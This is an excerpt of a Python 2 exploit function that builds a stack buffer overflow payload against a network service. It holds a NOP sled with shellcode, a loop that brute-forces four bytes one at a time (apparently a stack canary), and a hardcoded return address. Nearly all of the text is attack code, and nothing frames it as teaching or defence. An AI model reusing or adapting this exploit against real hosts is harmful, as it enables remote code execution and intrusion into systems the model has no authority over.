...
def exploit(host, port, shellcode):
    ...
    exploit = '\x90'* (2048 - len(shellcode)) + shellcode

    for byte in range(0,4):
	for c in range(0,256):
		if c == 10:
			continue
		if try_exploit(exploit + chr(c), host, port):
			continue
		else:
			exploit += chr(c)
			break
   
    exploit += "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
    exploit += "\xdc\xee\xff\xbf"
    try_exploit(exploit, host, port)
    print "Exploit Done."
